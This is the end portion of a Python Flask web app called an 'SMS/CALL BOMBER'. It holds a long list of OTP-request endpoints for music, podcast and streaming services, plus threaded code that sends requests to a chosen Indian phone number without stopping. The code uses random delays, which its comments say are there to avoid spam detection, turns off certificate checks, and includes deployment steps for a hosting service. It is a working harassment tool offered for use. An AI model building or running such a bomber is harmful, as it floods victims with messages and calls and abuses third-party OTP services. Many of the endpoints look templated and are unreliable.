    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 306
{
    'name': 'Yalla_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.yalla.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 307
{
    'name': 'Chamet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.chamet.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 308
{
    'name': 'Lemo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.lemo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 309
{
    'name': 'Tumile_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tumile.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 310
{
    'name': 'MeeLive_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meelive.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 311
{
    'name': 'StarMaker_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.starmaker.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 312
{
    'name': 'Smule_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smule.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 313
{
    'name': 'Starmaker_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.starmaker.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 314
{
    'name': 'Smule_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.smule.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
}
{
    'name': 'Triller_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.triller.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 316
{
    'name': 'Likee_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.likee.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 317
{
    'name': 'Bigo_Live_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bigolive.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 318
{
    'name': 'Kuaishou_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kuaishou.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 319
{
    'name': 'Douyin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.douyin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 320
{
    'name': 'Helo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.helo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 321
{
    'name': 'Zili_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zili.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 322
{
    'name': 'Vigo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vigo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 323
{
    'name': 'Uplive_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.uplive.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 324
{
    'name': '17Live_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.17live.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 325
{
    'name': 'Pococha_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pococha.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 326
{
    'name': 'Bambuser_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bambuser.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 327
{
    'name': 'StreamYard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.streamyard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Riverside_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.riverside.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 329
{
    'name': 'SquadCast_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.squadcast.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 330
{
    'name': 'Zencastr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zencastr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 331
{
    'name': 'Anchor_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.anchor.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 332
{
    'name': 'Spotify_For_Podcasters_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spotifypodcasters.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 333
{
    'name': 'Simplecast_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.simplecast.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 334
{
    'name': 'Podbean_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.podbean.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 335
{
    'name': 'Transistor_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.transistor.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 336
{
    'name': 'Castos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.castos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 337
{
    'name': 'RedCircle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.redcircle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 338
{
    'name': 'Acast_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.acast.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 339
{
    'name': 'Megaphone_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.megaphone.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 340
{
    'name': 'Art19_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.art19.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 341
{
    'name': 'Libsyn_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.libsyn.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 342
{
    'name': 'Blubrry_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blubrry.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 343
{
    'name': 'Soundcloud_Repost_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundcloudrepost.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 344
{
    'name': 'Mixcloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mixcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Hearthis_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hearthis.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 346
{
    'name': 'Audiomack_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.audiomack.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 347
{
    'name': 'Bandcamp_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandcamp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 348
{
    'name': 'Soundtrap_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundtrap.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 349
{
    'name': 'BandLab_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandlab.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 350
{
    'name': 'Soundtrap_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundtrap.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 351
{
    'name': 'BandLab_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandlab.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 352
{
    'name': 'SoundCloud_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundcloud.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 353
{
    'name': 'Mixcloud_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mixcloud.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 354
{
    'name': 'Audiomack_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.audiomack.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 355
{
    'name': 'Bandcamp_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandcamp.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 356
{
    'name': 'Hearthis_India_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hearthis.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 357
{
    'name': 'SoundTrap_Pro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundtrappro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 358
{
    'name': 'BandLab_Pro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bandlabpro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 359
{
    'name': 'Spotify_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spotifystudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 360
{
    'name': 'Apple_Podcast_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.applepodcaststudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Google_Podcast_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.googlepodcaststudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 362
{
    'name': 'Amazon_Music_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.amazonmusicstudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 363
{
    'name': 'Tidal_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tidalstudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 364
{
    'name': 'Deezer_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.deezerstudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 365
{
    'name': 'YouTube_Music_Studio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.youtubemusicstudio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 366
{
    'name': 'Vevo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vevo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 367
{
    'name': 'MTV_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mtv.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 368
{
    'name': 'VH1_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vh1.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 369
{
    'name': 'Comedy_Central_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.comedycentral.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 370
{
    'name': 'Nickelodeon_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nickelodeon.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 371
{
    'name': 'Cartoon_Network_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cartoonnetwork.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},


# ==================== GLOBAL STATE ====================
stats = {
    "running": False,
    "total_requests": 0,
    "successful_hits": 0,
    "failed_attempts": 0,
    "calls_sent": 0,
    "whatsapp_sent": 0,
    "sms_sent": 0,
    "start_time": 0,
    "logs": []
}

stats_lock = threading.Lock()


def add_log(message, log_type="info"):
    with stats_lock:
        timestamp = time.strftime("%H:%M:%S")
        stats["logs"].append(f"[{timestamp}] {message}")
        if len(stats["logs"]) > 100:
            stats["logs"] = stats["logs"][-100:]


def hit_api(api, phone):
    try:
        url = api["url"].replace("{phone}", phone)
        headers = dict(api.get("headers") or {})
        headers.setdefault("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36")

        data = api["data"].replace("{phone}", phone) if api["data"] else None

        method = api["method"].upper()
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=8, verify=False)
        elif method == "PUT":
            response = requests.put(url, headers=headers, data=data, timeout=8, verify=False)
        else:
            response = requests.post(url, headers=headers, data=data, timeout=8, verify=False)

        return response.status_code in [200, 201, 202, 204]
    except Exception:
        return False


def bombing_worker(api, phone):
    """Har API ka apna loop - continuous bombing"""
    while stats["running"]:
        with stats_lock:
            stats["total_requests"] += 1
            if api["type"] == "call":
                stats["calls_sent"] += 1
            elif api["type"] == "whatsapp":
                stats["whatsapp_sent"] += 1
            else:
                stats["sms_sent"] += 1

        success = hit_api(api, phone)

        with stats_lock:
            if success:
                stats["successful_hits"] += 1
                emoji = "📞" if api["type"] == "call" else ("📱" if api["type"] == "whatsapp" else "💬")
                add_log(f"{emoji} HIT: {api['name']} - SUCCESS! ({stats['successful_hits']})", "success")
            else:
                stats["failed_attempts"] += 1

        # 2-5 sec random delay per API (spam detection se bachne ke liye)
        time.sleep(random.uniform(2, 5))


@app.route("/")
def home():
    return send_from_directory(".", "index.html")


@app.route("/start", methods=["POST"])
def start_bombing():
    if stats["running"]:
        return jsonify({"status": "already_running"})

    phone = request.json.get("phone", "")
    mode = request.json.get("mode", "all")

    if not phone.isdigit() or len(phone) != 10:
        return jsonify({"status": "error", "message": "Invalid phone number"}), 400

    with stats_lock:
        stats["running"] = True
        stats["total_requests"] = 0
        stats["successful_hits"] = 0
        stats["failed_attempts"] = 0
        stats["calls_sent"] = 0
        stats["whatsapp_sent"] = 0
        stats["sms_sent"] = 0
        stats["start_time"] = time.time()
        stats["logs"] = []

    add_log(f"🚀 PRABHANJAN EXPLOITS STARTED!", "info")
    add_log(f"🎯 Target: +91{phone}", "info")
    add_log(f"💣 Mode: {mode.upper()}", "info")

    if mode == "sms":
        apis_to_use = [a for a in ULTIMATE_APIS if a["type"] == "sms"]
    elif mode == "call":
        apis_to_use = [a for a in ULTIMATE_APIS if a["type"] == "call"]
    elif mode == "whatsapp":
        apis_to_use = [a for a in ULTIMATE_APIS if a["type"] == "whatsapp"]
    else:
        apis_to_use = ULTIMATE_APIS

    add_log(f"⚡ Deploying {len(apis_to_use)} APIs!", "warn")

    # Har API ke liye ek thread start karo
    for api in apis_to_use:
        t = threading.Thread(target=bombing_worker, args=(api, phone), daemon=True)
        t.start()

    return jsonify({"status": "started", "apis": len(apis_to_use)})


@app.route("/stop", methods=["POST"])
def stop_bombing():
    stats["running"] = False
    add_log("🛑 ATTACK STOPPED BY USER!", "warn")
    return jsonify({"status": "stopped"})


@app.route("/stats", methods=["GET"])
def get_stats():
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    success_rate = (stats["successful_hits"] / stats["total_requests"] * 100) if stats["total_requests"] > 0 else 0

    return jsonify({
        "running": stats["running"],
        "sms_sent": stats["sms_sent"],
        "calls_sent": stats["calls_sent"],
        "whatsapp_sent": stats["whatsapp_sent"],
        "successful_hits": stats["successful_hits"],
        "total_requests": stats["total_requests"],
        "failed_attempts": stats["failed_attempts"],
        "success_rate": round(success_rate, 1),
        "elapsed": round(elapsed, 1),
        "logs": stats["logs"][-50:]
    })


# ==================== RENDER DEPLOYMENT SUPPORT ====================

if __name__ == "__main__":
    # Render PORT env variable use karta hai
    port = int(os.environ.get("PORT", 5000))
    print("=" * 50)
    print("💀 PRABHANJAN EXPLOITS - SMS/CALL BOMBER")
    print(f"🌍 Website: http://0.0.0.0:{port}")
    print("=" * 50)
    app.run(host="0.0.0.0", port=port, debug=False)

